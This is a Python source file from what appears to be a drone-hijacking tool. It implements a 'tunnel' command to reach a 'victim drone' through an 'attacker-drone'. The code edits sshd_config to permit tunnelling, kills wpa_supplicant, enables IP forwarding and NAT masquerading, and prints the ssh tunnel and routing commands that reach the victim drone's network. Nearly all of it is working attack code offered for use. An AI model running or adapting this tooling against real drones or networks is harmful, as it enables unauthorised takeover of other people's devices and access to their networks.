from lib.parser import SkyjackArgumentParser
from tempfile import NamedTemporaryFile, tempdir, _get_candidate_names
from shutil import copy2
from os import rename
from subprocess import Popen, PIPE, call
import netifaces as ni
from itertools import islice


class TunnelCommand():

    def __init__(self, interface):
        self.cmd = "tunnel"

        self.parser = SkyjackArgumentParser(prog=self.cmd, description="create a tunnel to victim drone")
        self.interface = interface

        self.parser.add_argument('-u', '--user', help="user which should be allowed to use the tunnel")
        self.parser.add_argument('-g', '--group', help="group which should be allowed to use the tunnel")
        self.parser.add_argument('-i', '--interface', help="interface to which clients must connect")
        self.parser.add_argument('-d', '--disable', help="disable tunnel", action="store_true")

    def execute(self, args):
        "creates a vpn tunnel via ssh"
        create_tunnel(self.interface, user=args.user, group=args.group, interface_client=args.interface, disable=args.disable)


def create_tunnel(interface, user=None, group=None, interface_client=None, disable=False):
    if disable:
        generic_execute('sysctl -w net.ipv4.ip_forward=0')
        # generic_execute(['ip', 'tuntap', 'del', 'dev', 'tun9', 'mode', 'tun'], shell=False)
        generic_execute(['ip', 'link', 'del', 'tun9'], shell=False)
        generic_execute('iptables -t nat -D POSTROUTING -o {} -j MASQUERADE'.format(interface))
        print "tunnel disabled"
    else:
        ip = None
        if interface_client:
            try:
                if_info = ni.ifaddresses(interface_client)
            except ValueError as e:
                print "Unable to access interface {}".format(interface_client)
                return

            # get ip of specified interface
            ip = if_info[2][0]['addr']

        prepare_sshd_config()
        generic_execute('service ssh restart')
        generic_execute('killall wpa_supplicant')
        generic_execute('sysctl -w net.ipv4.ip_forward=1')

        res, proc = generic_execute(['ip', 'tuntap', 'add', 'dev', 'tun9', 'mode', 'tun', 'user', user or "root", 'group', group or "root"], shell=False)
        if not res:
            print "An error occurred while opening the tunnel device"
            stdout, stderr = proc.communicate()
            print stderr.strip()
            if "busy" in stderr:
                print "It seems that the device already exists and is busy"
                print 'Try the "tunnel -d" command'
            return 1

        generic_execute('ip link set tun9 up')
        generic_execute('ip addr add 169.254.0.1/32 peer 169.254.0.2 dev tun9')

        # check if iptables rule already exists
        if generic_execute('iptables -t nat -C POSTROUTING -o {} -j MASQUERADE'.format(interface))[1].returncode == 1:
            generic_execute('iptables -t nat -A POSTROUTING -o {} -j MASQUERADE'.format(interface))

        print "Tunnel established"
        print "If the attacker-drone is not already connected to the victim-drone, you should connet them now"

        print "Following commands are needed in order to be able to connect to the drone:"
        print "ssh -N -T -w 0:9 {}@{}".format(user or "root", ip or "< attacker-ip >")
        print "ip link set tun0 up"
        print "ip addr add 169.254.0.2/32 peer 169.254.0.1 dev tun0"
        print "ip route add 192.168.1.1/32 via 169.254.0.1"


def generic_execute(shell_cmd, shell=True):
    process = Popen(shell_cmd, shell=shell, stdout=PIPE, stderr=PIPE)
    process.wait()
    return True if process.returncode == 0 else False, process


def prepare_sshd_config():
    # save seek position
    pos = 0

    with open('/etc/ssh/sshd_config', 'r+') as sshd:
        for i, line in enumerate(sshd):
            if line.lower().startswith('permittunnel'):
                # possible options: yes, point-to-point, ethernet, no
                if any(s in line.lower() for s in ['no', 'ethernet']):
                    # create backup of sshd_config
                    with NamedTemporaryFile(mode='r', dir='/etc/ssh', suffix=".sshd_config.bak", delete=False) as temp:
                        copy2('/etc/ssh/sshd_config', temp.name)
                        # go to permit tunnel line
                        sshd.seek(pos)
                        sshd.write('PermitTunnel yes\n')
                        # set seek position (sshd.seek(pos) is also ok)
                        sshd.flush()
                        # write remaining lines from backup into sshd_config
                        for elem in islice(temp, i + 1, None):
                            sshd.write(elem)
                        break
                else:
                    # no change required
                    break
            # save current position in file
            pos += len(line)
        else:
            # option PermitTunnel not found in file
            # create backup and append line to sshd_config
            with NamedTemporaryFile(mode='r', dir='/etc/ssh', suffix=".sshd_config.bak", delete=False) as temp:
                copy2('/etc/ssh/sshd_config', temp.name)
            sshd.write('PermitTunnel yes\n')
